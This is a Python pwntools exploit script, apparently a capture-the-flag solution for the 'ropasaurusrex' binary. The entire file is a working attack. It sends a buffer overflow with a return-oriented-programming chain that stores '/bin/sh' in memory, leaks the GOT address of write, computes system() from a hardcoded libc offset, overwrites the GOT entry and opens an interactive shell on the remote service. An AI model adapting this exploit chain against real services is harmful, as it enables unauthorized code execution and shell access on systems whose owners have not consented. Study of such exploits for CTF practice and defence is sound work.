from pwn import *

 

#p = process('./ropasaurusrex')

p = remote('localhost', 6666)

e = ELF('./ropasaurusrex')

 

pppr = 0x080484b6

binsh = "/bin/sh"

offset = 0x99a80         #write - system

 

read_plt = e.plt['read']

write_plt = e.plt['write']

write_got = e.got['write']

 

 

payload = ""

payload += "A"*(0x88 + 0x4)

 

payload += p32(read_plt)

payload += p32(pppr)

payload += p32(0)        #stdin

payload += p32(e.bss())

payload += p32(8)         #len(/bin/sh)

 

payload += p32(write_plt)

payload += p32(pppr)

payload += p32(1)        #stdout

payload += p32(write_got)

payload += p32(4)               #len(write_got)

 

payload += p32(read_plt)

payload += p32(pppr)

payload += p32(0)        #stdin

payload += p32(write_got)

payload += p32(4)        #len(write_got)

 

payload += p32(write_plt)

payload += "AAAA"

payload += p32(e.bss())

 

 

p.sendline(payload)

 

p.sendline("/bin/sh")

 

system = u32(p.recv(4)) - offset

print hex(system)

 

p.sendline(p32(system))

 

p.interactive()